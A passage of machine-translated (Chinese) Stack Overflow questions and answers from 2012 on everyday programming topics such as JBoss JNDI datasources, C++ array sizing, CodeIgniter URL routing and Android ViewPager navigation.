    <property name="persistenceUnitName" value="xxxx" />
    <property name="dataSource" ref="dataSource" />
    <property name="persistenceXmlLocation" value="classpath*:META-INF/persistence.xml"/>
    <property name="jpaVendorAdapter">
        <bean   
            class="org.springframework.orm.jpa.vendor.HibernateJpaVendorAdapter">
            <property name="databasePlatform"  
             value="org.hibernate.dialect.SQLServerDialect" />
            <property name="showSql" value="false" />
            <property name="generateDdl" value="false" />
        </bean>
    </property>
</bean>

<bean id="transactionManager" class="org.springframework.orm.jpa.JpaTransactionManager">
    <property name="entityManagerFactory" ref="entityManagerFactory" />
    <property name="dataSource" ref="dataSource" />
</bean>
... 
```

来自 applicationContext.xml 的“旧”数据源：

```
<bean id="dataSource" class="com.mchange.v2.c3p0.ComboPooledDataSource"
      destroy-method="close"> 
    <property name="driverClass" value="${database.driverClassName}" />
    <property name="jdbcUrl" value="${database.url}" />
    <property name="user" value="${database.username}" />
    <property name="password" value="${database.password}" />
    <property name="minPoolSize" value="5" />
    <property name="maxPoolSize" value="50" />
    <property name="initialPoolSize" value="10" />
    <property name="checkoutTimeout" value="0" />
    <property name="maxStatements" value="50" />
    <property name="maxIdleTime" value="300" />
</bean> 
```

数据库属性：

```
database.driverClassName=net.sourceforge.jtds.jdbc.Driver
database.url=jdbc:jtds:sqlserver://xxx:xxx/
database.username=username
database.password=pwd 
```

使用 jndi 的“新”数据源配置：

```
 <jee:jndi-lookup id="dataSource" jndi-name="java:jboss/datasources/myDataSource"
        expected-type="javax.sql.DataSource" resource-ref="false">
</jee:jndi-lookup> 
```

服务器日志：

```
Caused by: javax.resource.ResourceException: Wrong driver class [class org.h2.Driver] for 
this connection URL [jdbc:jtds:sqlserver://xxx:xxx]
at   
org.jboss.jca.adapters.jdbc.local.LocalManagedConnectionFactory.getLocalManagedConnection(
LocalManagedConnectionFactory.java:251)
... 68 more 
```

我必须在哪里添加驱动程序类？JNDI 调用正确吗？

# iphone - UILocalNotification 每分钟重复一次

> ID：13490573
> 
> 赞同：0
> 
> 时间：2012-11-21T09:55:40.303
> 
> 标签：iphone, ios, ios5, uilocalnotification, localnotification

我想每分钟发送一次本地通知，这是我正在使用的代码：

```
[[UIApplication sharedApplication] cancelAllLocalNotifications];

    UILocalNotification *notif = [[UILocalNotification alloc] init];

    if (notif == nil) {
        return;
    }

    notif.timeZone = [NSTimeZone defaultTimeZone];

    notif.alertBody = @"Test notification!";
    notif.alertAction = @"View";
    notif.soundName = UILocalNotificationDefaultSoundName;
    notif.applicationIconBadgeNumber += 1;

    notif.repeatInterval = NSMinuteCalendarUnit;

    [[UIApplication sharedApplication] scheduleLocalNotification:notif]; 
```

通知只开始一次，从不重复。我在哪里弄错了？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T10:15:19.177

您必须`fireDate`为您的通知设置一个，否则它不会重复但会立即触发。

> 根据为 timeZone 指定的值解释触发日期。如果指定的值为 nil 或者是过去的日期，则立即发送通知。

# blackberry - 黑莓文本框复制和粘贴

> ID：13490581
> 
> 赞同：1
> 
> 时间：2012-11-21T09:55:59.567
> 
> 标签：blackberry

是否可以从任何正在运行的应用程序复制文本`textfield`并在黑莓中以编程方式编辑该文本字段？我想要做的是你让你发短信，例如`BBM`你发短信给你，现在你去菜单并点击翻译。我的应用程序从聚焦的文本框中复制数据，然后相应地对其进行翻译，然后将其粘贴回来。

# .htaccess - .htaccess 在基本重写后在 url 中留下“index.php”，如何删除 index.php 并且仍然有重写工作？

> ID：13490582
> 
> 赞同：1
> 
> 时间：2012-11-21T09:56:00.027
> 
> 标签：.htaccess, mod-rewrite, url-rewriting

我对.htaccess url rewrites有问题。我有下面的简单行，它们的功能是在基本文件夹[.htaccess文件所在的位置]之后获取每个url，并在病房之后插入index.php，例如如果url是example.com/basefolder/subdirectory1/subdirectory2 那么它应该是 example.com/basefolder/index.php/subdirectory1/subdirectory2。

这发生得很完美，问题是在本地服务器上，url 的 index.php 部分是隐藏的，但在远程服务器上没有，在远程服务器上我仍然可以在 url 栏中看到。如何隐藏它以便即使虽然 url 仍然是 example.com/basefolder/subdirectory1/subdirectory2 有一个隐藏的 index.php 隐藏在 url 中？

重写引擎开启

RewriteBase /

RewriteCond %{REQUEST_FILENAME} !-f

RewriteRule (.*) [http://example.com/basefolder/index.php/](http://example.com/basefolder/index.php/) $1

# extjs - 如何通过服务器端更改 extjs 列

> ID：13490586
> 
> 赞同：0
> 
> 时间：2012-11-21T09:56:16.220
> 
> 标签：extjs

我有以下列将始终在我的网格中。

```
 columns:[
        {
            text:"Format",
            dataIndex:'Format',
            flex:1,
            sortable:true
        },
        {
            text:"Pending",
            dataIndex:'Pending',
            flex:1,
            sortable:true
        },
myExtraFields
// I have some extra columns i need to add here. 

] 
```

下面待定。我将列出通过服务器端条件更改的其他字段。我如何设置一个可以容纳多列的 javascript 变量，然后我将如何将其添加到网格中。

** 编辑 **

查看 myExtraFields 在哪里。我想在那里添加其他列。这个变量将位于我的 html 页面上。该变量将包含多列

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T10:28:50.133

您可以动态地制作列数组，在您的商店加载后，您可以检查您必须制作哪些列。然后，您可以调用[grid.reconfigure()](http://docs.sencha.com/ext-js/4-1/#!/api/Ext.grid.Panel-method-reconfigure "grid.reconfigure()")函数将新列加载到网格中。

例子：

```
var fixedColumns = [
    {
        text:"Format",
        dataIndex:'Format',
        flex:1,
        sortable:true
    },
    {
        text:"Pending",
        dataIndex:'Pending',
        flex:1,
        sortable:true
    }];
var variableColumns = [] //Generated by looking at your record
var columns = fixedColumns.concat(variableColumns);
grid.reconfigure(columns); 
```

# google-app-engine - 通过存储将 GAE 数据导入 BigQuery 失败

> ID：13490589
> 
> 赞同：0
> 
> 时间：2012-11-21T09:56:21.210
> 
> 标签：google-app-engine, google-bigquery, google-cloud-storage

在 Google App Engine 中，我使用 Datastore Admin 创建了一个备份。我选择了 Google Cloud Storage 作为目的地，现在我有了一个带有备份的存储桶。

现在我正在尝试将该数据导入 BigQuery。

在网站上，我创建了一个新数据集并单击“创建新表”。在“选择数据”步骤中，我选择了 AppEngine 数据存储备份和“从 Google Cloud Storage gs://mybucket 加载数据”。

那时我总是收到这个错误：

“源 URI 必须是 Google 存储位置：gs://mybucket”

在网站上，存储桶似乎很好： [https ://storage.cloud.google.com/](https://storage.cloud.google.com/)

而且`gsutil ls gs://mybucket`也有效，所以我不确定问题是什么。

还有其他一些 ACL 或我需要设置的东西吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-26T21:28:12.387

您需要指定 backup_info 文件的完整路径。

例如，位置可能是这样的：

```
gs://my_bucket/RhdGFzd9yS1hZ1pbi1vem.ReservationData.backup_info 
```

`gsutil ls gs://mybucket`执行命令时，您应该能够看到此文件名。

# c++ - 数组的大小 C++

> ID：13490591
> 
> 赞同：11
> 
> 时间：2012-11-21T09:56:37.467
> 
> 标签：c++, arrays, size

> **可能重复：**
> [作为参数传递的 Sizeof 数组](https://stackoverflow.com/questions/1328223/sizeof-array-passed-as-parameter)

我想知道为什么以下代码的输出是 1 和 9。这是因为函数大小中未声明的数组吗？如何将“数组大小”分离为函数？

```
#include "stdafx.h"
#include <iostream>
using namespace std;

int size(int a[])
{
    return sizeof a/sizeof a[0];
}

int main()
{   
    int a[] = {5,2,4,7,1,8,9,10,6};
    cout << size(a) << endl;
    cout << sizeof a/sizeof a[0] << endl;
    system("pause");
    return 0;
} 
```

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-11-21T10:00:45.453

当您编写时`size(a)`，您传递的是指针而不是数组。由于指针和 an 的大小`int`是 4 或 8（取决于 ABI），因此您会得到`sizeof(int *)/sizeof int`（**4/4=1**用于 32 位机器，**8/4=2**用于 64 位机器），即**1**或**2**。

在 C++ 中，当将数组作为参数传递给函数时，实际上是在传递指向数组的指针。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-11-21T10:04:34.083

Maroun85 的答案是正确的。这并不明显，但`a`in`int size(int a[])`是一个指针。

但是你为什么不以 c++ 的方式来做呢。使用`std::vector`_

```
std::vector<int> a = {5,2,4,7,1,8,9,10,6};
cout << a.size() << endl; 
```

这里没有技巧

- 编辑

如果您的编译器不支持 c++11。你可以做：

```
std::vector<int> a;
a.push(5);
a.push(2);
...
cout << a.size() << endl; 
```

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2012-11-21T10:00:42.373

您的`size()`函数不能像您希望的那样工作，因为当您将数组传递给函数时，数组会衰减为指向其第一个元素的指针。您`a`衰减到`int*`指针上的 a 和 sizeof 运算符返回指针的大小，而不是数组。考虑使用 a`std::vector<int>`代替，因为这将允许您在每次将向量传递给函数时检索向量的大小。

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2012-11-21T10:01:34.857

将数组传递给函数时，它们会衰减为指针。因此，您的`size()`功能相当于：

```
int size(int* a)
{
    return sizeof a/sizeof a[0];
} 
```

And`sizeof a`是指针的大小，与此处的 int 大小相同，因此是输出。

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2012-11-21T10:17:21.827

为什么您的解决方案不起作用的最佳解释是 Maroun 的回答。

关于问题的第二部分（“怎么做？”），您可以使用模板函数执行此操作：

```
template <typename T, size_t n> const size_t size(const T (&)[n]) { return n; } 
```

当然，这只有在数组的大小是常量时才有效（常量，如编译器所见），但无论如何它只能在这种情况下工作——数组不会在任何地方存储它的大小，所以如果它不是已知的编译时常数，没有办法知道它。

如果您需要它来处理*不是*编译时常量的数组（例如，您使用 分配的东西`operator new[]`，或使用非标准编译器扩展），您需要在某处显式存储大小。

（顺便说一下，我上面的陈述在*技术上*是错误的，实际上分配大小通常是存储的，但这是一个你不能也不应该依赖的实现细节。）

* * *

## 回答 #6

> 赞同：4
> 
> 时间：2012-11-21T10:00:47.150

请记住，数组总是通过指针传递。

因此，函数`a`中有一个指向 的指针`int`，并且（对于 32 位整数）指向的指针的大小与 a`int`的大小相同`int`。

* * *

## 回答 #7

> 赞同：4
> 
> 时间：2012-11-21T10:01:19.113

`sizeof`在编译时评估，而不是在运行时评估。编译器不会分析您传递给 function的内容`size`，而是将 function 参数视为指针。因此，在您的函数`size`中，结果`sizeof a`是指向an的*指针*`int`的大小，偶然地，它等于`int`系统上 an 的大小。

# c++ - 是否有 API 或简单的方法来检查卷是否在 Windows Server 2012 上进行了重复数据删除？

> ID：13490592
> 
> 赞同：1
> 
> 时间：2012-11-21T09:56:40.947
> 
> 标签：c++, windows, windows-server-2012

[这是有关重复数据删除 API](http://msdn.microsoft.com/en-us/library/windows/desktop/hh449204%28v=vs.85%29.aspx)的 MSDN 页面，似乎没有 API 可以检查卷是否已删除重复数据。

一种方法是检查“系统卷信息”下是否有一个名为“Dedup”的文件夹，但我不认为它对每种情况都是可靠的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-05T04:04:08.503

可以在 powershell 中获取去重卷的列表。在页面下方的三分之一处查看以下链接

[http://windows-scripting.org/category/windows-2012/](http://windows-scripting.org/category/windows-2012/)

# javascript - HTML/Javascript - 如何增加工具提示的时间跨度

> ID：13490595
> 
> 赞同：0
> 
> 时间：2012-11-21T09:56:45.690
> 
> 标签：javascript, html

当我将鼠标悬停在帮助图标上时，此处“这是关于图像的描述”级别显示为工具提示。但工具提示仅显示 10 秒。

有什么方法可以将工具提示的时间跨度增加到 1 分钟或直到鼠标指针位于帮助图标上。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T10:22:01.910

不幸的是，没有任何传统的方法可以做到这一点。但是您可以使用一些第三方 js 来构建自定义工具提示。参考：[https ://stackoverflow.com/a/7662359/1805210](https://stackoverflow.com/a/7662359/1805210)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T10:11:54.737

如果您使用 html 标准方式来获得工具提示（即带有“title”属性），它们由浏览器处理，并且它的行为是浏览器（系统？） - 特定的。如果你想要一些你可以自己处理的东西，我想你应该去找一些 JS 来做：例如[这里是一个演示](http://swip.codylindley.com/tooltipDemo.html%20a%20demo%20of%20tooltip%20in%20js)和[jquery 工具提示插件 wiki 页面](http://docs.jquery.com/Plugins/Tooltip%20jquery%20wiki%20page)。

这种方法的优点是您可以设置工具提示的样式。缺点是你有一些开发工作要做。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-21T10:26:15.720

我建议使用自定义 Javascript 库来显示工具提示。

看看[这个](http://www.walterzorn.de/en/tooltip/tooltip_e.htm)

您还可以使用此自定义工具提示的显示持续时间。

# asp.net - 使用@RenderPage 时页面标题未更改

> ID：13490597
> 
> 赞同：2
> 
> 时间：2012-11-21T09:56:49.627
> 
> 标签：asp.net, razor

我正在使用`@RenderPage`在两个相似页面中重用代码。两页中的每一页仅包含`@RenderPage`：

```
@RenderPage("~/Views/PathToImplementation.cshtml", new { paramsListHere }) 
```

重用的代码（内部`PathToImplementation.cshtml`）用于`ViewBag.Title`设置页面标题：

```
ViewBag.Title = somethingUseful; 
```

问题是`ViewBag.Title`从重用代码内部更改对原始页面没有影响 - 没有任何反应。

如何从调用的代码更改页面标题`@RenderPage`？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-22T13:22:46.463

看起来当`RenderPage`被使用时`ViewBag`被复制并且副本被传递到`RenderPage`呈现的页面中并且没有回头路。所以到目前为止我发现的最干净的方法是将引用传递给调用`RenderPage`. 像这样的东西：

```
//calling page
@RenderPage( PathToPage.cshtml, new { ParentPage = this } )

//PathToPage.cshtml
@{  WebViewPage parentPage = PageData["ParentPage"];
    parentPage.ViewBag.Title = blahblahblhah;      
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T10:41:32.070

如果您的标题在内部`PathToImplementation.cshtml`并使用参数在内部设置标题`PathToImplementation.cshtml`，则应使用 访问您的参数`PageData`。[微软](http://msdn.microsoft.com/en-us/library/system.web.webpages.webpagebase.renderpage%28v=vs.99%29.aspx)_

这是一个[例子](http://our.umbraco.org/wiki/reference/code-snippets/razor-snippets/@renderpage-with-args)

前任;

```
 @PageData[index]; //Or 
   @PageData["title"]; 
```

# javascript - 如果数字为 1，如何显示单词“Comment”，否则使用 Javascript 显示“Comments”？

> ID：13490600
> 
> 赞同：0
> 
> 时间：2012-11-21T09:56:59.323
> 
> 标签：javascript, jquery, facebook, if-statement

我正在使用只能访问 HTML 的 Facebook 评论。没有服务器端脚本。

我的默认输出是“# Comments”。

```
<a class="comments" href="URL"><div class="fb-comments-count" data-href="URL"></div> Comments</a> 
```

如果评论数量为 1，我如何使用 Javascript 使“评论”变成“评论”？

感谢您的帮助！

编辑：

我正在使用标准的 Facebook 评论标签：[https ://developers.facebook.com/docs/reference/plugins/comments/](https://developers.facebook.com/docs/reference/plugins/comments/)

输出的 HTML 为：

```
 <a class="comments" href="URL"><div class="fb-comments-count" data-href="URL" fb-xfbml-state="rendered"><span class="fb_comments_count">4</span></div> Comments - Click to Add Yours</a> 
```

如果它是 0，或者高于 1，我只想说“评论”。如果它是 1，我只想说“评论”。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T10:01:47.953

```
function commentText(numberOfComments){
 return "comment" +((numberOfComments > 1 )?"s":"");

} 
```

使用 Facebook JS SDK 查找评论数。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T10:04:10.760

您可以使用此功能：

```
function comment_text( num_comments ){
    return 'comment'+ ( num_comments === 1 ? '' : 's' );
} 
```

像这样：

```
var comment_count = $('.fb-comments-count').text();
$(selector).text('Showing '+ comment_count + comment_text(comment_count) ); 
```

注意：我已将 更改`num_comments > 1`为`num_comments === 1`因为您想显示*0 条评论*，而不是*0 条评论*

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-21T10:05:22.787

您可以使用 jQuery.length 来计算存在多少评论类实例，然后如果数字为 1，您可以使用 jQuery.HTML 来更改 div 的内容

所以...

```
var commentCount =  $('.FBcomment').length();

if(commentCount == 1){

 $('.comments').html('Comment');//would be more efficient to have an id here rather than a class

 } 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-21T10:06:03.190

希望这可以帮助：

```
 <a class="comments" href="URL"><div class="fb-comments-count" data-href="URL">6</div> <span class="comment-text">Comments</span></a>        
    <a class="comments" href="URL"><div class="fb-comments-count" data-href="URL">0</div> <span class="comment-text">Comments</span></a>        
    <a class="comments" href="URL"><div class="fb-comments-count" data-href="URL">1</div> <span class="comment-text">Comments</span></a>        
    <a class="comments" href="URL"><div class="fb-comments-count" data-href="URL">3</div> <span class="comment-text">Comments</span></a>        
    <script type="text/javascript">
    $(document).ready(function(){
        $(".comments").each(function(){
            var count = parseInt($(this).find(".fb-comments-count").text());
            if( count > 1){
                $(this).find(".comment-text").text('Comments');
            }
            else if(count == 0){
            $(this).find(".comment-text").text('');
            }
            else{
                $(this).find(".comment-text").text('Comment');
            }
        });
    });
    </script> 
```

# java - 找不到类 com.mysql.jdbc.Driver

> ID：13490602
> 
> 赞同：1
> 
> 时间：2012-11-21T09:57:07.093
> 
> 标签：java, mysql

我收到了这个错误

`java.lang.ClassNotFoundException: com.mysql.jdbc.Driver`

但我`pom.xml`在我的`maven dependencies`文件夹中有这个类。每次我向所有内容添加一些库时`pom.xml`都可以，直到现在我什至尝试做 maven -> update project 但它没有帮助

我正在使用 Eclipse Juno

```
Class.forName("com.mysql.jdbc.Driver").newInstance();
Connection c = DriverManager.getConnection("jdbc:mysql://localhost/test", "root", "*****");     
return c; 
```

编辑 `pom.xml`

```
<dependency>
    <groupId>mysql</groupId>
    <artifactId>mysql-connector-java</artifactId>
    <version>5.1.21</version>
    <scope>compile</scope>
</dependency> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T10:12:51.030

有一种更严格的方式来获得连接：

连接 c = new com.mysql.jdbc.Driver().connect("jdbc:mysql://localhost/test?user=root&password=root", null);

不会有ClassNotFoundException之类的谜题

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T10:19:44.863

你如何启动服务器？你如何进行部署？从日食内部？如果 jar 在那里，请检查已部署的文件夹。如果您使用的是 Eclipse，它将位于：

`${workspace}\.metadata\.plugins\org.eclipse.wst.server.core\tmp0\wtpwebapps\ROOT\WEB-INF\lib` （如果使用窗户）

您的 Maven 配置和代码看起来不错，我会说这是一个部署问题。

* * *

## 回答 #3

> 赞同：-2
> 
> 时间：2012-11-21T10:00:26.773

您需要将 mysql 连接器 jar 作为外部 jar 添加到项目类路径中。然后它将正常工作：D

# mysql - 评论和回复的数据库设计

> ID：13490609
> 
> 赞同：16
> 
> 时间：2012-11-21T09:57:21.500
> 
> 标签：mysql, database, database-design, one-to-many

我想创建两个表，一个带有评论，另一个带有回复，它们之间具有一对多的关系。但是如果他们也可以回复回复怎么办，那该怎么改变呢？这是我为一对多所拥有的，但我不知道如果也可以回复回复，它应该是什么样子。

```
 Comments:
•   Id
•   Title
•   Text

    Replies:
•   Id
•   Title
•   Text
•   Comment id 
```

提前致谢。

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2012-11-21T10:01:29.330

您可以只使用一个包含 ParentID 字段的表。如果记录没有值，则为评论，否则为回复（对评论或回复）。

您可以查询记录的 ParentID 记录（检查*它的*ParentID）以查看此回复是针对评论还是回复。

**编辑**：以上是一个相当实用的解决方案。但是，要使用规范化版本，仍然保留一个 Comments 表（没有 ParentID），并创建一个带有 CommentID 和 ResponseID 的 ReplyTo 表，这两个表都是 Comments 表中记录的 ID。

使用这个想法，下面的 sql 将显示评论和对每个评论的“回复”，每个回复都有评论：

```
select c.comment, r.comment as reply
from comment as c, comment as r, replyto as rt
where c.ID = rt.CommentID
and r.ID = rt.ReplyID 
```

正如 Dimitrii 指出的那样，它不会显示没有回复的评论 - 为此你需要一个外部连接查询（没有测试语法）：

```
SELECT c.comment, r.comment as reply,
from Comment c 
  left outer join Comment r on c.id = r.id  
  left outer join replyto rt on rt.responseid = r.id 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2022-02-13T13:07:05.547

我对评论和评论回复做了同样的事情。我创建了同一个表并添加了 parent_id 列并使用对象关联进行管理。

[![在此处输入图像描述](../Images/2ca453ebbdc8a474546acaf5bb211e88.png)](https://i.stack.imgur.com/rsdSL.png)

以下是评论实体：

公共类评论{

```
@Id
@GeneratedValue(strategy = GenerationType.IDENTITY)
private int id;

@Column(name = "message") 
private String message;

@ManyToOne(cascade = CascadeType.ALL, fetch = FetchType.LAZY)
@JoinColumn(name = "post_id")
private Post post;

@ManyToOne(cascade = {CascadeType.DETACH, CascadeType.MERGE, CascadeType.PERSIST,
        CascadeType.REFRESH})
@JoinColumn(name ="user_id")
private User user;

@OneToMany(cascade = {CascadeType.DETACH, CascadeType.MERGE, CascadeType.PERSIST,
        CascadeType.REFRESH})
@JoinColumn(name="parent_id")
private List<Comment> replies;

public Comment(String message) {
    this.message = message;
}

public void addCommentReplies(Comment comment) {
    if(replies == null) {
        replies = new ArrayList<>();
    }
    replies.add(comment);
} 
```

}

* * *

这是将现有评论引用添加为 parent_id 并添加新评论：

```
session.beginTransaction();

        int postId=1; // today is my birthday
        Post post = session.get(Post.class, postId);
        //add likes to the post

        Comment parentComment = session.get(Comment.class, 1);

        Comment replie1 = new Comment("First replied to comment - 1");

        Comment replie2 = new Comment("second replies to the comment - 2");

        int userId = 3;
        User user = session.get(User.class, userId);
        replie1.setUser(user);
        replie2.setUser(user);
        replie1.setPost(post);
        replie2.setPost(post);
        parentComment.addCommentReplies(replie1);
        parentComment.addCommentReplies(replie2);

        session.save(replie1);
        session.save(replie2);

        System.out.println("comment added successful..");

        session.getTransaction().commit(); 
```

# android - 通过片段水平滚动，也可以通过按钮访问片段？

> ID：13490610
> 
> 赞同：0
> 
> 时间：2012-11-21T09:57:25.343
> 
> 标签：android, button, onclick, android-fragments

我一直在绞尽脑汁没有解决办法。解释我想要的最简单的方法是在我绘制的这个 png 中：http: [//i.imgur.com/42XLi.png](http://i.imgur.com/42XLi.png)

因此，我在第一个屏幕上有 4 个 TextView 和 ImageView，如果您向它们滑动，我希望能够以相同的动画效果将我带到其他屏幕。有很多应用程序可以做到这一点，但我实际上不知道如何自己实现它。显然，我必须首先使用 OnClickListener 使我的 ImageViews 和 TextViews 可点击。我在里面做什么？

我已经使用 Fragments 设置了水平滚动，但最后一块拼图是我正在努力解决的问题。我想让用户选择他们如何导航我的应用程序，有些人可以单击 ImageViews/TextViews 来为他们滑动，或者有些人可以向右滑动以访问其他片段。

希望我已经正确解释了这一点。事实上，Play 商店做了我想要的，除了它使用标签（从顶级免费到顶级付费等）。那是我不想使用的东西（标签）。我希望我可以通过在 TextViews 和 ImageViews 上设置的 onClicks 来复制它。

我真的很感激任何帮助！我已经使用支持库完成了这项工作，所以如果这有所作为，它不仅仅是 3.0+。

编辑：实际上，在做一些研究时，我遇到了一个叫做“FragmentTransaction”的东西。这是做这一切的正确方法吗？刚接触，所以不是很明白。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T11:07:44.267

您正在寻找的是一个`ViewPager`. 我制作了一个小样本来向您展示如何做出所需的行为：

```
private class MyAdapter extends FragmentPagerAdapter {

    public MyAdapter(FragmentManager fm) {
        super(fm);
    }

    @Override
    public Fragment getItem(int position) {
        if (position == 0) {
            return StarterFragment.newInstance(R.id.viewPagerIdFromTheLayout);
        } else {
            return NormalFragment.newInstance(position);
        }
    }

    @Override
    public int getCount() {
        return 5;
    }

}

public static class StarterFragment extends ListFragment {

    public static StarterFragment newInstance(int pagerId) {
        StarterFragment sf = new StarterFragment();
        Bundle args = new Bundle();
        args.putInt("pagerId", pagerId);
        sf.setArguments(args);
        return sf;
    }

    @Override
    public void onListItemClick(ListView l, View v, int position, long id) {
        ((ViewPager) getActivity().findViewById(
                getArguments().getInt("pagerId"))).setCurrentItem(position,
                true);
    }

    @Override
    public void onActivityCreated(Bundle savedInstanceState) {
        super.onActivityCreated(savedInstanceState);
        setListAdapter(new ArrayAdapter<String>(getActivity(),
                android.R.layout.simple_list_item_1, new String[] { "None",
                        "First Page", "Second Page", "Third Page", "Forth Page" }));
    }

}

public static class NormalFragment extends Fragment {

    public static NormalFragment newInstance(int position) {
        NormalFragment nf = new NormalFragment();
        Bundle args = new Bundle();
        args.putInt("position", position);
        nf.setArguments(args);
        return nf;
    }

    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container,
            Bundle savedInstanceState) {
        TextView tv = new TextView(getActivity());
        tv.setText("Fragment no." + getArguments().getInt("position"));
        return tv;
    }

} 
```

代码是这样的。`ViewPager`您将使用上面看到的适配器创建一个。在这种情况下，`ViewPager`您将有两种类型`Fragments`，第一种具有所有方向性`Buttons`，另一种类型`Fragments`是滚动到的法线。为简单起见，我使用了`ListFragment`，您可以使用自己的布局与`Buttons`，您可以轻松地调整代码。为此，`Fragment`您将传递`ViewPager`from 的id`FragmentActivity`以供以后使用。当用户`Buttons`从第一个中单击其中一个时`Fragment`，在 that 的`onClick`方法中`Button`，您将使用`getActivity()`and`findViewById`找到`ViewPager`并使用其`setCurrentItem(position, true)`上的方法滚动到该方法`Fragment`。因为`ViewPager`仍然可以在`Fragments`.

# codeigniter - codeigniter - 更改 url 以获得更好的 SEO

> ID：13490612
> 
> 赞同：0
> 
> 时间：2012-11-21T09:57:34.673
> 
> 标签：codeigniter, seo, codeigniter-routing

如何更改以下网址

从：

```
http://localhost/autoquest/index.php/autos?category=camry 
```

至：

```
http://localhost/autoquest/index.php/autos/camry 
```

使用代码点火器。类别选项 camry 来自一个选择选项，例如：

```
<select id="category" name="category" onchange="this.form.submit()">
    <option value="camry">car 1</option>
    <option value="octavia">car 2</option>
    <option value="volvo">car 3</option>
</select> 
```

我认为第二个网址在 SEO 方面更好我错了吗？

谢谢大家。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T10:01:30.437

你看过了`config/routes.php`吗？您可以在那里定义重写规则。如果您将配置参数`index_page`(in `config/config.php`) 设置为空，您也可以将其删除`index.php`。但是您应该阅读有关 url 的文档： http: [//ellislab.com/codeigniter/user_guide/general/urls.html](http://ellislab.com/codeigniter/user_guide/general/urls.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-21T12:21:53.163

您是否在 Codeigniter 配置中启用了查询字符串？

这是第 155 行附近的 application/config/config.php：

```
$config['enable_query_strings'] = FALSE; 
```

如果将其设置为 FALSE，则您不应像建议的那样使用查询字符串，但实际上使用默认的基于搜索引擎友好分段的 URL。如用户指南中所述。所以你的网址会自动成为

`http://localhost/autoquest/index.php/autos/camry`

代替

`http://localhost/autoquest/index.php/autos?category=camry`

有关更多信息，请在此处查看出色的用户指南：http: [//ellislab.com/codeigniter/user_guide/general/urls.html](http://ellislab.com/codeigniter/user_guide/general/urls.html)

希望这可以帮助。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-22T07:08:46.530

连同上述，

您可以通过在根目录下的 .htaccess 中编写以下代码来删除 index.php。

* * *

重写引擎开启

RewriteBase /你的站点文件夹

RewriteCond %{REQUEST_URI} ^system.*

RewriteCond $1 !^(index.php|images|js|css|robots.txt)

重写规则 ^(.*)$ /index.php/$1 [L]

RewriteCond %{REQUEST_FILENAME} !-f

RewriteCond %{REQUEST_FILENAME} !-d

重写规则 ^(.*)$ index.php/$1 [L]

选项 - 索引

DirectoryIndex index.php

* * *

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-21T10:02:31.497

你可以这样做............当你提交这个表单调用一个javascript函数。将您的选项值作为参数发送给该函数。在该函数中使用 window.href 函数分配你的 base_url + '/'+ controller_name+'/'+ function_name_in_controller +'/'+ option_value.....。

从控制器中的该函数调用您的视图文件.......

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2015-08-01T10:45:58.623

- 试试这个 - 在 routes.php 中更改

```
$route['autos'] = 'YourController/yourMethod/$1"; 
```

- 并更改使您在 veiw 中的链接像这样。

```
<?php echo base_url().'autos/'.$parameter;?> 
```

- 没有 index.php 的 url 对 SEO 来说要好得多，您可以通过将以下代码添加到您的 .htaccess 文件中来删除它，该文件位于根目录中，如果不存在，则创建它并将以下代码粘贴到其中。

```
<ifModule mod_rewrite.c>
    Options +FollowSymLinks
    RewriteEngine on

    RewriteCond %{REQUEST_FILENAME} !-s
    RewriteCond %{REQUEST_FILENAME} !-f
    RewriteCond %{REQUEST_FILENAME} !-d

    RewriteCond $1 !^(index\.php|images|robots\.txt)
    RewriteRule ^(.*)$ index.php/$1 [L]
</ifModule> 
```

# android - 无法在 Android 中显示从 JSON 解析的数据

> ID：13490613
> 
> 赞同：1
> 
> 时间：2012-11-21T09:57:35.390
> 
> 标签：android, json

大家好，我正在尝试显示我从包含名称、图像和内容（textview、imageview 和 textview）的 JSON 字符串中获取的数据。我能够从 JSON 中获取数据，但我无法显示它，甚至我的 Logcat 也没有出现任何错误。

我正在尝试的代码是

```
try {
     bookDetails = json.getJSONArray(TAG_DETAILS);
     for (int i = 0; i < bookDetails.length(); i++) 
     {
     JSONObject c = bookDetails.getJSONObject(i);
     String image1 = c.getString(TAG_IMAGE1);
     String image2=c.getString(TAG_IMAGE2);
     String Bid = c.getString(TAG_ID);
     String Bname = c.getString(TAG_NAME);
     String Bdesc= c.getString(TAG_DESCRIPTION);
     String BbookId=c.getString(TAG_BOOKID);
     HashMap<String, String> map = new HashMap<String, String>();
     map.put(TAG_IMAGE1, image1);
     map.put(TAG_IMAGE2, image2);
     map.put(TAG_ID,Bid);
     map.put(TAG_NAME,Bname);
     map.put(TAG_DESCRIPTION,Bdesc);
     map.put(TAG_BOOKID,BbookId);
     booksList.add(map);
     String[] captionArray = (String[]) ((List<NameValuePair>) map).toArray(new String[map.size()]);
